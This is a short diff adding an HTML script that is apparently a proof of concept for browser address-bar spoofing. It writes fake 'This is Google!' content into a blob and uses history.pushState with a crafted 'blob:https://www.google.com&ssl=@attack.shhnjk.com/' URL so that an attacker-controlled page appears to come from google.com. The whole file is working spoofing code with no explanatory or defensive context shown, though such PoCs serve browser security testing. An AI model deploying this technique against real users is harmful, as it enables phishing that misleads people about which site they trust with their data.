@@ -1,0 +1,6 @@
+<script>
+    var text = "This is Google!<script>history.pushState('','','blob:https://www.google.com&ssl=@attack.shhnjk.com/')<\/script>";
+    var blob = new Blob([text], {type : 'text/html'});
+    var url = URL.createObjectURL(blob);
+    location.href=url;
+</script>
